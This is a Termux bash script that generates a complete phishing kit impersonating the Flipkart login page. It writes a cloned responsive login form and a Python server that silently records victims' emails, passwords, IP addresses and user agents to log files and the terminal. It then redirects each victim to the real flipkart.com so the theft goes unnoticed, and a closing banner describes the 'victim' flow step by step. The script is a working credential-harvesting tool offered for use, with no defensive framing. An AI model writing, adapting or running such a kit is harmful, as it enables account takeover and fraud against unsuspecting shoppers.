#!/data/data/com.termux/files/usr/bin/bash

# ==========================================
# FLIPKART LOGIN CLONE - CLEAN VERSION
# RESPONSIVE ON ALL DEVICES
# CAPTURE INFO ONLY IN TERMUX + FILES
# 90%+ BASH - TERMUX OPTIMIZED
# ==========================================

R='\033[1;31m'; G='\033[1;32m'; Y='\033[1;33m'; B='\033[1;34m'; C='\033[1;36m'; W='\033[1;37m'; NC='\033[0m'

banner() {
clear
echo -e "${C}"
echo "  ███████╗██╗     ██╗██████╗ ██╗  ██╗ █████╗ ██████╗ ████████╗"
echo "  ██╔════╝██║     ██║██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗╚══██╔══╝"
echo "  █████╗  ██║     ██║██████╔╝█████╔╝ ███████║██████╔╝   ██║   "
echo "  ██╔══╝  ██║     ██║██╔═══╝ ██╔═██╗ ██╔══██║██╔══██╗   ██║   "
echo "  ██║     ███████╗██║██║     ██║  ██╗██║  ██║██║  ██║   ██║   "
echo "  ╚═╝     ╚══════╝╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   "
echo -e "${W}"
echo "  ╔══════════════════════════════════════════════════════╗"
echo "  ║     FLIPKART LOGIN CLONE - CLEAN v4.0                ║"
echo "  ║     No capture info on website                       ║"
echo "  ║     Capture visible only in Termux + files           ║"
echo "  ║     90%+ BASH - TERMUX                              ║"
echo "  ╚══════════════════════════════════════════════════════╝"
echo -e "${NC}"
}

check_deps() {
echo -e "${Y}[*] Checking dependencies...${NC}"
for dep in python curl; do
    if ! command -v "$dep" &>/dev/null; then
        echo -e "${C}[+] Installing $dep...${NC}"
        pkg install "$dep" -y -qq 2>/dev/null
    fi
done
echo -e "${G}[✓] All dependencies ready${NC}"
sleep 1
}

get_ip() {
IP=$(ifconfig 2>/dev/null | grep -E 'inet.*broadcast' | awk '{print $2}' | head -1)
[ -z "$IP" ] && IP=$(ip addr 2>/dev/null | grep -E 'inet.*192\.|inet.*10\.|inet.*172\.' | awk '{print $2}' | cut -d'/' -f1 | head -1)
[ -z "$IP" ] && IP="127.0.0.1"
echo -e "${G}[✓] Local IP: $IP${NC}"
}

BASE_DIR="$HOME/flipkart-capture"
mkdir -p "$BASE_DIR"
cd "$BASE_DIR"

# ==========================================
# INDEX.HTML - Clean Flipkart Login Page
# Fully responsive - NO capture info shown
# ==========================================
cat > index.html << 'INDEXEOF'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Flipkart Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;}

body{
min-height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:#f1f3f6;
padding:16px;
}

.container{
width:100%;
max-width:850px;
background:white;
display:flex;
flex-direction:row;
box-shadow:0 2px 16px rgba(0,0,0,0.1);
overflow:hidden;
}

.left{
width:38%;
background:#2874f0;
padding:36px 28px;
position:relative;
color:white;
display:flex;
flex-direction:column;
min-height:500px;
}

.logo{
display:flex;
align-items:center;
gap:8px;
margin-bottom:40px;
}

.logo-box{
width:42px;height:42px;
background:#ffe500;border-radius:4px;
display:flex;justify-content:center;align-items:center;
font-size:26px;font-weight:bold;color:#2874f0;
flex-shrink:0;
}

.logo-text{
font-size:28px;font-style:italic;font-weight:bold;
letter-spacing:0.5px;
}

.left h1{
font-size:40px;font-weight:500;margin-bottom:16px;line-height:1.1;
}

.left p{
font-size:19px;line-height:1.7;color:#dbeafe;font-weight:300;
}

.shop-area{
position:absolute;bottom:20px;left:50%;transform:translateX(-50%);
width:100%;max-width:220px;height:180px;
}

.phone{
position:absolute;bottom:5px;left:50%;transform:translateX(-50%);
width:90px;height:150px;background:#3c3c3c;border-radius:16px;border:5px solid #555;
}

.phone::before{
content:"";position:absolute;top:8px;left:50%;transform:translateX(-50%);
width:24px;height:3px;background:#ddd;border-radius:6px;
}

.screen{
position:absolute;top:16px;left:6px;right:6px;bottom:6px;
background:#dff6ff;border-radius:8px;
display:flex;justify-content:center;align-items:center;font-size:32px;
}

.shop-top{
position:absolute;top:-8px;left:-6px;right:-6px;height:28px;
background:linear-gradient(90deg,#ff6b00 0%,#ff6b00 20%,white 20%,white 40%,#ff6b00 40%,#ff6b00 60%,white 60%,white 80%,#ff6b00 80%,#ff6b00 100%);
border-radius:8px 8px 0 0;
}

.bag1{
position:absolute;bottom:0;left:5px;width:40px;height:60px;background:#ff6b00;border-radius:4px;
}

.bag1::before{
content:"";position:absolute;top:-8px;left:50%;transform:translateX(-50%);
width:16px;height:12px;border:2px solid white;border-bottom:none;border-radius:8px 8px 0 0;
}

.bag2{
position:absolute;bottom:0;right:5px;width:70px;height:72px;background:#ffd400;border-radius:6px;
}

.bag2::before{
content:"";position:absolute;top:-10px;left:50%;transform:translateX(-50%);
width:28px;height:14px;border:3px solid #666;border-bottom:none;border-radius:12px 12px 0 0;
}

.right{
width:62%;
padding:48px 40px;
background:#fafafa;
display:flex;
flex-direction:column;
justify-content:center;
}

.login-box{
background:white;padding:24px 28px;border-radius:4px;
box-shadow:0 1px 8px rgba(0,0,0,0.06);
}

.input-group{margin-bottom:22px;position:relative;}

.input-group input{
width:100%;padding:10px 4px;
border:none;border-bottom:2px solid #e0e0e0;
outline:none;font-size:15px;background:transparent;
transition:border-color 0.2s ease;
}

.input-group input:focus{
border-bottom-color:#2874f0;
}

.input-group input::placeholder{color:#999;font-size:14px;}

.options{
display:flex;justify-content:space-between;align-items:center;
font-size:13px;margin-bottom:20px;color:#555;
}

.options label{
display:flex;align-items:center;gap:6px;cursor:pointer;
}

.options label input{width:15px;height:15px;accent-color:#2874f0;}

.options a{
color:#2874f0;text-decoration:none;font-weight:600;font-size:13px;
}

.options a:hover{text-decoration:underline;}

.login-btn{
width:100%;padding:14px;
border:none;background:#fb641b;
color:white;font-size:18px;font-weight:600;
border-radius:3px;cursor:pointer;
transition:background 0.2s ease;
letter-spacing:0.5px;
}

.login-btn:hover{background:#e85d19;}
.login-btn:active{background:#d45518;}

.signup{
margin-top:20px;text-align:center;font-size:13px;color:#555;
}

.signup a{
color:#2874f0;font-weight:600;text-decoration:none;
}

.signup a:hover{text-decoration:underline;}

@media(max-width:768px){
body{padding:12px;}
.container{max-width:450px;flex-direction:column;}
.left{width:100%;min-height:auto;padding:28px 24px 160px;align-items:center;text-align:center;}
.logo{justify-content:center;margin-bottom:24px;}
.left h1{font-size:32px;}
.left p{font-size:16px;max-width:300px;margin:0 auto;}
.shop-area{width:180px;height:140px;}
.phone{width:70px;height:120px;border-width:4px;}
.screen{font-size:24px;}
.shop-top{height:22px;}
.bag1{width:32px;height:48px;}
.bag2{width:55px;height:58px;}
.right{width:100%;padding:32px 24px;}
.login-box{padding:20px;}
}

@media(max-width:480px){
body{padding:0;background:white;}
.container{max-width:100%;box-shadow:none;}
.left{padding:24px 20px 140px;}
.left h1{font-size:28px;}
.left p{font-size:14px;}
.shop-area{width:150px;height:120px;}
.phone{width:60px;height:100px;border-width:3px;border-radius:12px;}
.phone::before{width:20px;height:2px;top:6px;}
.screen{font-size:20px;top:12px;left:4px;right:4px;bottom:4px;}
.shop-top{height:18px;}
.bag1{width:26px;height:40px;}
.bag2{width:45px;height:48px;}
.right{padding:28px 20px;}
.login-btn{font-size:16px;padding:12px;}
}

@media(max-width:359px){
.left{padding:20px 16px 120px;}
.left h1{font-size:24px;}
.left p{font-size:13px;}
.right{padding:20px 16px;}
.login-box{padding:16px;}
.input-group input{font-size:14px;padding:8px 4px;}
.login-btn{font-size:15px;padding:10px;}
}

@media(max-height:500px) and (orientation:landscape){
body{padding:8px;}
.container{flex-direction:row;}
.left{width:35%;min-height:auto;padding:16px 12px 100px;}
.left h1{font-size:20px;margin-bottom:8px;}
.left p{display:none;}
.logo{margin-bottom:12px;}
.logo-box{width:30px;height:30px;font-size:18px;}
.logo-text{font-size:20px;}
.shop-area{width:100px;height:80px;bottom:5px;}
.phone{width:45px;height:72px;border-width:3px;border-radius:8px;}
.screen{font-size:14px;top:10px;left:3px;right:3px;bottom:3px;}
.shop-top{height:14px;}
.bag1{width:18px;height:28px;}
.bag2{width:32px;height:34px;}
.right{width:65%;padding:20px 16px;}
.login-box{padding:14px;}
.input-group{margin-bottom:14px;}
.input-group input{padding:6px 4px;font-size:13px;}
.options{font-size:12px;margin-bottom:14px;}
.login-btn{font-size:14px;padding:10px;}
.signup{margin-top:14px;font-size:12px;}
}
</style>
</head>
<body>

<div class="container">

<div class="left">
<div class="logo">
<div class="logo-box">F</div>
<div class="logo-text">Flipkart</div>
</div>
<h1>Login</h1>
<p>Get access to your<br>Orders, Wishlist and<br>Recommendations</p>
<div class="shop-area">
<div class="bag1"></div>
<div class="phone">
<div class="shop-top"></div>
<div class="screen">&#x1F455;</div>
</div>
<div class="bag2"></div>
</div>
</div>

<div class="right">
<div class="login-box">
<form id="loginForm" action="/capture" method="POST">
<div class="input-group">
<input type="text" name="email" id="email" placeholder="Enter Email/Mobile number" required>
</div>
<div class="input-group">
<input type="password" name="password" id="password" placeholder="Enter Password" required>
</div>
<div class="options">
<label>
<input type="checkbox" checked> Remember me
</label>
<a href="#">Forgot Password?</a>
</div>
<button type="submit" class="login-btn">Login</button>
</form>
</div>
<div class="signup">
New to Flipkart? <a href="#">Sign up</a>
</div>
</div>

</div>

</body>
</html>
INDEXEOF
echo -e "${G}[✓] index.html created - Clean login page, no capture info shown${NC}"

# ==========================================
# CAPTURE SERVER - Silent capture
# No capture info displayed on website
# Data only visible in Termux terminal and files
# ==========================================
cat > capture_server.py << 'PYEOF'
#!/usr/bin/env python3
"""
Flipkart Capture Server
Captures credentials silently
Data visible only in Termux terminal and log files
Website shows NO capture information
"""

import http.server
import socketserver
import urllib.parse
import json
import os
import sys
from datetime import datetime

PORT = PORT_PLACEHOLDER
LOG_FILE = "captured_credentials.txt"
JSON_FILE = "captured_credentials.json"
counter = 0


class CaptureHandler(http.server.SimpleHTTPRequestHandler):

    def do_POST(self):
        global counter

        if self.path != '/capture':
            self.send_response(404)
            self.end_headers()
            return

        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)

        email = "unknown"
        password = "unknown"
        timestamp = str(datetime.now())
        user_agent = self.headers.get('User-Agent', 'unknown')

        try:
            parsed = urllib.parse.parse_qs(body.decode('utf-8'))
            email = parsed.get('email', ['unknown'])[0].strip()
            password = parsed.get('password', ['unknown'])[0].strip()
        except Exception:
            pass

        counter += 1
        self.log_credential(counter, email, password, timestamp, user_agent, "POST")

        # Redirect to Flipkart (silent - no capture info shown)
        self.send_response(302)
        self.send_header('Location', 'https://www.flipkart.com')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()

    def do_GET(self):
        # Serve static files normally
        super().do_GET()

    def log_credential(self, cid, email, password, timestamp, user_agent, method):
        ip = self.client_address[0]
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Console output - THIS IS THE ONLY PLACE CAPTURE INFO APPEARS
        print(f"\n{'='*60}")
        print(f"  [#{cid}] CREDENTIAL CAPTURED!")
        print(f"{'='*60}")
        print(f"  Time    : {now}")
        print(f"  Method  : {method}")
        print(f"  IP      : {ip}")
        print(f"  Email   : {email}")
        print(f"  Password: {password}")
        print(f"  UA      : {user_agent[:50]}...")
        print(f"{'-'*60}")

        # Text log file
        with open(LOG_FILE, 'a') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"  [#{cid}] {now}\n")
            f.write(f"{'='*60}\n")
            f.write(f"  Method  : {method}\n")
            f.write(f"  IP      : {ip}\n")
            f.write(f"  Email   : {email}\n")
            f.write(f"  Password: {password}\n")
            f.write(f"  UA      : {user_agent}\n")
            f.write(f"{'-'*60}\n")

        # JSON log file
        entry = {
            "id": cid,
            "timestamp": now,
            "method": method,
            "ip": ip,
            "email": email,
            "password": password,
            "user_agent": user_agent
        }
        try:
            with open(JSON_FILE, 'r') as f:
                data = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            data = []
        data.append(entry)
        with open(JSON_FILE, 'w') as f:
            json.dump(data, f, indent=2)


if __name__ == '__main__':
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    print("")
    print("=" * 60)
    print("  FLIPKART CAPTURE SERVER RUNNING")
    print("=" * 60)
    print(f"  Login page : http://0.0.0.0:{PORT}")
    print(f"  Capture URL: http://0.0.0.0:{PORT}/capture")
    print(f"  Log file   : {LOG_FILE}")
    print(f"  JSON file  : {JSON_FILE}")
    print("")
    print("  [*] Captured data will appear BELOW only in Termux")
    print("  [*] No capture info is shown on the website")
    print("=" * 60)

    socketserver.TCPServer.allow_reuse_address = True
    httpd = socketserver.TCPServer(("0.0.0.0", PORT), CaptureHandler)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\n[!] Server stopped by user.")
        httpd.shutdown()
        sys.exit(0)
PYEOF
echo -e "${G}[✓] capture_server.py created - Silent capture${NC}"

# ==========================================
# Inject PORT
# ==========================================
sed -i "s|PORT_PLACEHOLDER|8080|g" capture_server.py
chmod +x capture_server.py

# ==========================================
# Touch log files
# ==========================================
touch captured_credentials.txt captured_credentials.json

# ==========================================
# DASHBOARD
# ==========================================
clear
echo -e "${C}"
echo "  ╔══════════════════════════════════════════════════════════╗"
echo "  ║               SYSTEM READY                              ║"
echo "  ╠══════════════════════════════════════════════════════════╣"
echo -e "  ║  ${W}Login Page    :${G} http://localhost:8080${C}                    ║"
echo -e "  ║  ${W}Network       :${G} http://${IP}:8080${C}                         ║"
echo "  ╠══════════════════════════════════════════════════════════╣"
echo -e "  ║  ${Y}Capture URL   :${G} http://${IP}:8080/capture${C}                 ║"
echo "  ╠══════════════════════════════════════════════════════════╣"
echo -e "  ║  ${R}CAPTURE INFO VISIBLE ONLY IN:${C}                               ║"
echo -e "  ║  1. This Termux terminal (real-time)                  ║"
echo -e "  ║  2. captured_credentials.txt (text file)              ║"
echo -e "  ║  3. captured_credentials.json (JSON file)             ║"
echo "  ╠══════════════════════════════════════════════════════════╣"
echo -e "  ║  ${G}HOW IT WORKS:${C}                                                ║"
echo -e "  ║  1. Victim visits login page                          ║"
echo -e "  ║  2. Form silently POSTs to /capture                   ║"
echo -e "  ║  3. Server logs to files + Termux terminal            ║"
echo -e "  ║  4. Victim is redirected to flipkart.com              ║"
echo -e "  ║  5. Victim sees NO capture info whatsoever            ║"
echo "  ╠══════════════════════════════════════════════════════════╣"
echo -e "  ║  ${R}CAPTURED DATA WILL APPEAR BELOW IN TERMINAL${C}                ║"
echo "  ╚══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ==========================================
# START SERVER
# ==========================================
echo -e "${Y}[*] Starting capture server on port 8080...${NC}"
python capture_server.py
